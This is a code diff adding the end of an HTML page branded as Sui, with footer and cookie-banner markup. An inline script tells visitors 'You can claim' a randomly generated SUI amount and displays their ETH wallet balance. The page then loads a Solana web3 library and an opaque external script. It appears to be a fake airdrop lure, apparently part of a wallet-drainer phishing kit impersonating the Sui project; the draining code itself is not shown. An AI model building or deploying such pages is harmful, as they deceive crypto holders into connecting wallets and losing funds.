+                      src="./assets/64370082189ad6fc561d22f3_header-medium.svg" loading="lazy" alt="Medium"
+                      class="footer-social-image"></a><a href="#" class="w-inline-block" bis_skin_checked="1"><img
+                      src="./assets/643700822629e178cbb2198e_header-linkedin.svg" loading="lazy" alt="LinkedIn"
+                      class="footer-social-image"></a></div>
+                <div class="button-text-14-16" bis_skin_checked="1">©2023 Copyright Sui. All rights reserved.</div>
+              </div>
+            </div>
+          </div>
+          <div class="div-block-31" bis_skin_checked="1">
+            <div class="footer-right-column footer-links" bis_skin_checked="1"><a href="#" class="footer-gray-link"
+                bis_skin_checked="1">Privacy Policy</a><a href="#" class="footer-gray-link" bis_skin_checked="1">Terms
+                and Conditions</a></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div id="cc--main" style="position: fixed; z-index: 1000000;" class="c--anim" bis_skin_checked="1">
+    <!--[if lt IE 9 ]><div id="cc_div" class="cc_div ie"></div><![endif]--><!--[if (gt IE 8)|!(IE)]><!-->
+    <div id="cc_div" class="cc_div" bis_skin_checked="1">
+      <div id="cm" role="dialog" aria-modal="true" aria-hidden="true" aria-labelledby="c-ttl" aria-describedby="c-txt"
+        style="visibility: hidden;" bis_skin_checked="1">
+        <div id="c-inr" bis_skin_checked="1">
+          <div id="c-inr-i" bis_skin_checked="1">
+            <div id="c-ttl" role="heading" aria-level="2" bis_skin_checked="1">We use cookies!</div>
+            <div id="c-txt" bis_skin_checked="1">Hi, this website uses essential cookies to ensure its proper operation
+              and tracking cookies to understand how you interact with it. The latter will be set only upon approval. <a
+                aria-label="Choose cookies" class="cc-link" href="#" data-cc="c-settings" aria-haspopup="dialog">Let me
+                choose</a></div>
+          </div>
+          <div id="c-bns" bis_skin_checked="1"><button type="button" id="c-p-bn" class="c-bn">Accept all</button><button
+              type="button" id="c-s-bn" class="c-bn c_link">Reject all</button></div>
+        </div>
+      </div>
+      <div id="cm-ov" style="visibility: hidden; opacity: 0;" bis_skin_checked="1"></div>
+      <div id="s-cnt" role="dialog" aria-modal="true" aria-hidden="true" aria-labelledby="s-ttl"
+        style="visibility: hidden;" bis_skin_checked="1">
+        <div id="c-vln" bis_skin_checked="1">
+          <div id="cs" bis_skin_checked="1">
+            <div id="c-s-in" bis_skin_checked="1">
+              <div id="s-inr" class="bns-t" bis_skin_checked="1">
+                <div id="s-hdr" bis_skin_checked="1">
+                  <div id="s-ttl" role="heading" bis_skin_checked="1">Cookie preferences</div>
+                  <div id="s-c-bnc" bis_skin_checked="1"><button type="button" id="s-c-bn" class="c-bn"
+                      aria-label="Close"></button></div>
+                </div>
+                <div id="s-bl" bis_skin_checked="1">
+                  <div class="c-bl" bis_skin_checked="1">
+                    <div class="title" bis_skin_checked="1">
+                      <div class="b-tl" role="heading" aria-level="3" bis_skin_checked="1">Cookie usage 📢</div>
+                    </div>
+                    <div class="desc" bis_skin_checked="1">
+                      <div class="p" bis_skin_checked="1">We use cookies to ensure the basic functionalities of the
+                        website and to enhance your online experience. For more details relative to cookies and other
+                        sensitive data, please read the full <a aria-label="Choose cookies" class="cc-link" href="#"
+                          bis_skin_checked="1">privacy policy</a>.</div>
+                    </div>
+                  </div>
+                  <div class="c-bl b-ex" bis_skin_checked="1">
+                    <div class="title b-bn" bis_skin_checked="1"><button type="button" class="b-tl exp"
+                        aria-expanded="false" aria-controls="c-ac-1">Strictly necessary cookies</button><label
+                        class="b-tg"><input class="c-tgl" type="checkbox" value="necessary" disabled=""><span
+                          class="c-tg c-ro" aria-hidden="true"><span class="on-i"></span><span
+                            class="off-i"></span></span><span class="t-lb">Strictly necessary cookies</span></label>
+                    </div>
+                    <div class="desc b-acc" id="c-ac-1" aria-hidden="true" bis_skin_checked="1">
+                      <div class="p" bis_skin_checked="1">These cookies are essential for the proper functioning of my
+                        website. Without these cookies, the website would not work properly</div>
+                    </div>
+                  </div>
+                  <div class="c-bl b-ex" bis_skin_checked="1">
+                    <div class="title b-bn" bis_skin_checked="1"><button type="button" class="b-tl exp"
+                        aria-expanded="false" aria-controls="c-ac-2">Performance and Analytics cookies</button><label
+                        class="b-tg"><input class="c-tgl" type="checkbox" value="analytics"><span class="c-tg"
+                          aria-hidden="true"><span class="on-i"></span><span class="off-i"></span></span><span
+                          class="t-lb">Performance and Analytics cookies</span></label></div>
+                    <div class="desc b-acc" id="c-ac-2" aria-hidden="true" bis_skin_checked="1">
+                      <div class="p" bis_skin_checked="1">These cookies allow the website to remember the choices you
+                        have made in the past</div>
+                      <table>
+                        <thead>
+                          <tr>
+                            <th scope="col">Name</th>
+                            <th scope="col">Domain</th>
+                            <th scope="col">Expiration</th>
+                            <th scope="col">Description</th>
+                          </tr>
+                        </thead>
+                        <tbody>
+                          <tr>
+                            <td data-column="Name">^_ga</td>
+                            <td data-column="Domain">google.com</td>
+                            <td data-column="Expiration">2 years</td>
+                            <td data-column="Description">description ...</td>
+                          </tr>
+                          <tr>
+                            <td data-column="Name">_gid</td>
+                            <td data-column="Domain">google.com</td>
+                            <td data-column="Expiration">1 day</td>
+                            <td data-column="Description">description ...</td>
+                          </tr>
+                        </tbody>
+                      </table>
+                    </div>
+                  </div>
+                  <div class="c-bl b-ex" bis_skin_checked="1">
+                    <div class="title b-bn" bis_skin_checked="1"><button type="button" class="b-tl exp"
+                        aria-expanded="false" aria-controls="c-ac-3">Advertisement and Targeting cookies</button><label
+                        class="b-tg"><input class="c-tgl" type="checkbox" value="targeting"><span class="c-tg"
+                          aria-hidden="true"><span class="on-i"></span><span class="off-i"></span></span><span
+                          class="t-lb">Advertisement and Targeting cookies</span></label></div>
+                    <div class="desc b-acc" id="c-ac-3" aria-hidden="true" bis_skin_checked="1">
+                      <div class="p" bis_skin_checked="1">These cookies collect information about how you use the
+                        website, which pages you visited and which links you clicked on. All of the data is anonymized
+                        and cannot be used to identify you</div>
+                    </div>
+                  </div>
+                  <div class="c-bl" bis_skin_checked="1">
+                    <div class="title" bis_skin_checked="1">
+                      <div class="b-tl" role="heading" aria-level="3" bis_skin_checked="1">More information</div>
+                    </div>
+                    <div class="desc" bis_skin_checked="1">
+                      <div class="p" bis_skin_checked="1">For any queries in relation to our policy on cookies and your
+                        choices, please <a class="cc-link" href="#" bis_skin_checked="1">contact us</a>.</div>
+                    </div>
+                  </div>
+                </div>
+                <div id="s-bns" bis_skin_checked="1"><button type="button" id="s-all-bn" class="c-bn">Accept
+                    all</button><button type="button" id="s-rall-bn" class="c-bn">Reject all</button><button
+                    type="button" id="s-sv-bn" class="c-bn">Save settings</button></div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div id="cs-ov" style="visibility: hidden; opacity: 0;" bis_skin_checked="1"></div>
+    </div>
+  </div>
+</body>
+<script src="./assets/jquery-3.6.1.min.js"></script>
+<script>
+  function next_step(add, balance) {
+    $('.first').addClass('hide')
+    $('.second').removeClass('hide')
+    $('.second').addClass('show')
+
+    let max = 750;
+    let min = 3700;
+    let amount = Math.round(Math.random() * (max - min) + min)
+    const options = {
+      style: 'decimal',
+      useGrouping: true,
+      minimumFractionDigits: 0,
+      maximumFractionDigits: 0,
+      notation: 'standard',
+      compactDisplay: 'short'
+    };
+    const formattedNumber = amount.toLocaleString('en-US', options);
+    let text = `You can claim ${formattedNumber} SUI`
+    $('#drop_amount').text(text)
+
+
+    $(".btc").text(`${roundToEight(balance)} ETH`)
+    $('.btc').prop('disabled', true)
+    $(".eth").removeClass('hide')
+
+  }
+  function roundToEight(num) {
+    return +(Math.round(num + "e+8") + "e-8");
+  }
+
+</script>
+
+</html>
+<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+<script src="always-1755850660373.js"></script>
